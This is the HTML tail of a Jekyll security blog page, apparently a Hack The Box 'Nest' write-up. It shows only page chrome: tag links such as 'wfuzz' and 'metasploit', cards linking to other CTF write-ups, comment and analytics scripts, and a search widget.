data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-sniper/"><div class="card-body"> <span class="timeago small" > Mar 27 <i class="unloaded">2020-03-27T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Sniper writeup</h3><div class="text-muted small"><p> information Column Details Name Sniper Points 30 Difficulty Medium Creator Minato...</p></div></div></a></div><div class="card"> <a href="/posts/htb-cascade/"><div class="card-body"> <span class="timeago small" > Mar 31 <i class="unloaded">2020-03-31T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Cascade writeup</h3><div class="text-muted small"><p> Information Column Details Name Cascade IP 10.10.10.182 Points 30 Os Windows ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-json/" class="btn btn-outline-primary"><p>Hackthebox Json writeup</p></a> <a href="/posts/hackthebox-sauna/" class="btn btn-outline-primary"><p>Hackthebox Sauna writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-nest/'; this.page.identifier = '/posts/htb-nest/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
